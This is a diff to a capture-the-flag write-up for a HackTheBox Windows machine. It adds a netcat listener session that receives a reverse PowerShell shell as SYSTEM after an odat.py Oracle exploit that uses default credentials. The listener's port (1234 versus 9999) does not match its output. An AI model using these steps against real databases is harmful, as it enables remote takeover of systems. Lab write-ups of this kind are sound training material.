@@ -121,7 +121,18 @@ python3 odat.py externaltable -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE
 The database must have been running with SYSTEM privileges and so we got a shell as `SYSTEM`.
 
 ```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes]
+└─$ nc -lvnp 1234
+listening on [any] 9999 ...
+connect to [10.10.16.6] from (UNKNOWN) [10.10.10.82] 49202
+Windows PowerShell running as user SILO$ on SILO
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
 
+PS C:\oraclexe\app\oracel\product\11.2.0\server>whoami
+whoami
+nt authority\system
 ```
 
 The database must have been running with SYSTEM privileges and so we got a shell as SYSTEM.
+
+So we can grab both the flags.
